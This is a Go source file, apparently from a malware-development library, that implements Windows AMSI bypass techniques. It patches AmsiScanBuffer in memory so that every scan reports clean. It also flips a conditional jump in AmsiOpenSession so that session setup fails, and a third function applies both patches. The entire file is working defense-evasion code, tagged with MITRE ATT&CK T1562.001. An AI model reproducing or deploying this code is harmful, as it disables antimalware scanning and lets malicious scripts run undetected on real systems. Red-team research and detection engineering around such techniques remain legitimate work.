//go:build windows

// Package amsi provides AMSI (Antimalware Scan Interface) bypass techniques.
//
// Technique: Runtime memory patching of amsi.dll functions.
// MITRE ATT&CK: T1562.001 (Impair Defenses: Disable or Modify Tools)
// Detection: Medium — EDR may monitor VirtualProtect on amsi.dll pages.
//
// Two methods:
//   - PatchScanBuffer: overwrites AmsiScanBuffer to return S_OK (AMSI_RESULT_CLEAN)
//   - PatchOpenSession: flips a conditional jump in AmsiOpenSession
package amsi

import (
	"fmt"
	"unsafe"

	"github.com/oioio-space/maldev/win/api"
	wsyscall "github.com/oioio-space/maldev/win/syscall"
)

// PatchScanBuffer patches AmsiScanBuffer to always return S_OK (AMSI_RESULT_CLEAN).
// The patch overwrites the function entry with: xor eax, eax; ret (31 C0 C3).
// This makes AMSI report all scans as clean, effectively disabling it.
//
// Returns nil if amsi.dll is not loaded (nothing to patch).
// If caller is non-nil, memory protection changes use the specified syscall method.
func PatchScanBuffer(caller *wsyscall.Caller) error {
	proc := api.Amsi.NewProc("AmsiScanBuffer")
	if err := proc.Find(); err != nil {
		return nil // AMSI not loaded
	}
	// xor eax, eax; ret — returns S_OK / AMSI_RESULT_CLEAN
	patch := []byte{0x31, 0xC0, 0xC3}
	return api.PatchMemoryWithCaller(proc.Addr(), patch, caller)
}

// PatchOpenSession patches AmsiOpenSession to prevent AMSI initialization.
// Scans the first 1024 bytes of the function for a JZ (0x74) conditional jump
// and flips it to JNZ (0x75), causing the session open to always fail.
//
// Returns nil if amsi.dll is not loaded.
// If caller is non-nil, memory protection changes use the specified syscall method.
func PatchOpenSession(caller *wsyscall.Caller) error {
	proc := api.Amsi.NewProc("AmsiOpenSession")
	if err := proc.Find(); err != nil {
		return nil // AMSI not loaded
	}
	addr := proc.Addr()
	for i := uintptr(0); i < 1024; i++ {
		b := *(*byte)(unsafe.Pointer(addr + i))
		if b == 0x74 { // JZ
			return api.PatchMemoryWithCaller(addr+i, []byte{0x75}, caller) // JNZ
		}
	}
	return fmt.Errorf("AmsiOpenSession: conditional jump (0x74) not found in first 1024 bytes")
}

// PatchAll applies both PatchScanBuffer and PatchOpenSession.
// Returns the first error encountered, or nil if both succeed.
func PatchAll(caller *wsyscall.Caller) error {
	if err := PatchScanBuffer(caller); err != nil {
		return fmt.Errorf("AmsiScanBuffer: %w", err)
	}
	if err := PatchOpenSession(caller); err != nil {
		return fmt.Errorf("AmsiOpenSession: %w", err)
	}
	return nil
}
